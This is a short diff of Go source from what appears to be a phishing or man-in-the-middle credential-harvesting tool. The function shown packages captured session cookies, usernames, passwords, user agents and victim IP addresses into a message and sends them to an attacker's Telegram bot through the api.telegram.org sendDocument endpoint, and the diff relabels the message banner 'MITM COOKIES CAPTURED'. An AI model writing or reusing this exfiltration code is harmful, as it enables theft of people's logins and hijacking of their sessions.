@@ -54,7 +54,7 @@ func sendTelegramResult(cookies string, username string, password string,  usera
 
 	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
 	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := "🍁 Cookies Captured 🍁\n\n****** [ 💻 Valid Login  💻 ] ******\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n🎌 IP:   https://ip-api.com/" + remote_addr + "\n\n⁎⁎⁎⁎⁎⁎ ANONYMOUS ⁎⁎⁎⁎⁎⁎⁎⁎"
+	msg := "🍁 MITM COOKIES CAPTURED 🍁\n\n****** [ 💻 Valid Login  💻 ] ******\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n🎌 IP:   https://ip-api.com/" + remote_addr + "\n\n⁎⁎⁎⁎⁎⁎ ANONYMOUS ⁎⁎⁎⁎⁎⁎⁎⁎"
 	
 
 	err = os.WriteFile(fileName, []byte(cookies), 0755)
